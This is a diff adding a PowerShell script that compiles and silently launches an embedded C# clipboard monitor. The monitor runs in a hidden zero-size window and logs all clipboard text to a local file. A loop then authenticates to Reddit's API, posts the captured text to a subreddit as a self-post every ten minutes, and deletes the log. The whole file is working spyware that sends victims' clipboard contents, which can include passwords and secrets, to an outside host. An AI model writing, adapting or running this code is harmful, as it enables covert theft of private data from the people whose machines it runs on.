@@ -1,0 +1,158 @@
+$source = @"
+using System;
+using System.Drawing;
+using System.IO;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+ 
+public class ClipboardMonitor
+{
+
+
+    [STAThread]
+    public static void Main()
+    {
+        ClipboardMonitor instance = new ClipboardMonitor();
+        
+            
+           
+    }
+
+    public ClipboardMonitor()
+    {
+
+        Application.Run(new ClipboardMonitorForm(this));
+
+
+    }
+
+
+}
+ 
+public class ClipboardMonitorForm : Form
+{
+    public ClipboardMonitorForm(ClipboardMonitor clipboardMonitor)
+    {
+        HideForm();
+        Hook();
+        Application.Run(this);
+    }
+ 
+ 
+    void HideForm()
+    {
+        FormBorderStyle = FormBorderStyle.None;
+        ShowInTaskbar = false;
+        Load += (sender, args) => { Size = new Size(0, 0); };
+    }
+ 
+    void Hook()
+    {
+        LoadDLL.AddClipboardFormatListener(Handle);
+    }
+ 
+    
+ 
+    protected override void WndProc(ref Message m)
+    {
+        switch ((WM) m.Msg)
+        {
+            case WM.WM_CLIPBOARDUPDATE:
+                ClipboardChanged();
+                break;
+ 
+            default:
+                base.WndProc(ref m);
+                break;
+        }
+    }
+ 
+    void ClipboardChanged()
+    {
+         File.AppendAllText("C:\\test.txt", Clipboard.GetText());
+    }
+}
+ 
+public enum WM
+{
+    WM_CLIPBOARDUPDATE = 0x031D
+}
+
+public class LoadDLL
+{
+
+
+    [DllImport("User32.dll", CharSet = CharSet.Auto)]
+    public static extern bool AddClipboardFormatListener(IntPtr hWndObserver);
+
+}
+"@
+
+Add-Type -TypeDefinition $source  -referencedassemblies System.Windows.Forms, System.Drawing -Language CSharp -OutputAssembly "C:\test.exe" -OutputType ConsoleApplication
+
+$app = start-process -WindowStyle hidden -filepath C:\test.exe -passthru
+
+$user = ""
+$password = "" 
+$clientID = ""
+$clientSecret = ConvertTo-SecureString "" -AsPlainText -Force
+$creds = New-Object -TypeName System.management.Automation.PSCredential -ArgumentList $clientID, $clientSecret 
+
+$credentials = @{
+
+grant_type = "password"
+username = $user
+password = $password
+scope = "*"
+
+}
+
+while ($True) {
+
+If ((Test-Path C:\test.txt) -eq $True) {
+
+    $token = Invoke-RestMethod -Method Post -Uri "https://www.reddit.com/api/v1/access_token" -Body $Credentials -ContentType 'application/x-www-form-urlencoded' -Credential $Creds
+
+    $header = @{
+
+    Authorization = "bearer $($Token.access_token)"
+
+    }
+
+    $body = @{
+
+    api_type = "json"
+    kind = "self"
+    sr = "VABlAHMAdABDACYAQwA"
+    title = "Test"
+    text = "$(get-content C:\test.txt)"
+    redirect_uri = "http://127.0.0.1:69/authorize_callback"
+
+    }
+
+    Try {
+
+        invoke-restmethod -method post -uri https://oauth.reddit.com/api/submit -headers $header -body $body 
+
+        }
+    Catch {
+
+        continue
+    
+        }
+
+    Remove-item "C:\test.txt"
+
+    Sleep 600
+
+    }
+
+ Else {
+
+        Sleep 600
+
+    }
+
+}
